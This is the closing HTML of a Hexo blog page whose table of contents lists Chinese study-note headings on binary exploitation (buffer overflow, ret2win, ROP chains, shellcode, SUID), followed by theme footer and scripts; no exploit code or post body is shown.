swup?loadWaline():window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">目录</div><div class="page-title">【Pvvn】可能是学习笔记吧</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-text">目录</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">240922</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%80%E9%9C%80%E7%8E%AF%E5%A2%83"><span class="nav-text">所需环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="nav-text">缓冲区溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-text">动态调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-text">静态调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95"><span class="nav-text">利用缓冲区溢出绕过登录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">240924</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E5%A0%86%E6%A0%88%E4%B8%8A%E7%9A%84%E5%8F%98%E9%87%8F"><span class="nav-text">覆盖堆栈上的变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E8%B0%83%E8%AF%95-v2"><span class="nav-text">静态调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-v2"><span class="nav-text">动态调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A6%86%E7%9B%96%E7%A8%8B%E5%BA%8F%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%EF%BC%88ret2win%EF%BC%89"><span class="nav-text">覆盖程序函数的返回地址（ret2win）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-v3"><span class="nav-text">动态调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E4%B8%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%92%8C%E6%9E%84%E9%80%A0ROP%E9%93%BE"><span class="nav-text">32位程序与64位程序和构造ROP链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#32%E4%BD%8D"><span class="nav-text">32位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#64%E4%BD%8D"><span class="nav-text">64位</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">240925-240926</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%85%A5shellcode"><span class="nav-text">写入shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID"><span class="nav-text">SUID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF-v2"><span class="nav-text">获取文件信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-v6"><span class="nav-text">动态调试</span></a></li></ol></li></ol></li></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2022</span> - 2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a><p class="post-count space-x-0.5"><span>共撰写了 77 篇文章 </span><span>共 293.4k 字</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">访问人数</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">总访问量</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span> <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span></div><div>博客已运行 <span class="odometer" id="runtime_days"></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li><li class="go-comment"><i class="fa-regular fa-comments"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div></main><script src="/js/libs/Swup.min.js"></script><script src="/js/libs/SwupSlideTheme.min.js"></script><script src="/js/libs/SwupScriptsPlugin.min.js"></script><script src="/js/libs/SwupProgressPlugin.min.js"></script><script src="/js/libs/SwupScrollPlugin.min.js"></script><script src="/js/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/tools/imageViewer.js" type="module"></script><script src="/js/utils.js" type="module"></script><script src="/js/main.js" type="module"></script><script src="/js/layouts/navbarShrink.js" type="module"></script><script src="/js/tools/scrollTopBottom.js" type="module"></script><script src="/js/tools/lightDarkSwitch.js" type="module"></script><script src="/js/layouts/categoryList.js" type="module"></script><script src="/js/tools/codeBlock.js" type="module"></script><script src="/js/layouts/lazyload.js" type="module"></script><script src="/js/tools/runtime.js"></script><script src="/js/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/libs/Typed.min.js"></script><script src="/js/plugins/typed.js" type="module"></script><script src="/js/libs/anime.min.js"></script><div class="post-scripts" data-swup-reload-script><script src="/js/tools/tocToggle.js" type="module"></script><script src="/js/layouts/toc.js" type="module"></script><script src="/js/plugins/tabs.js" type="module"></script></div></body></html>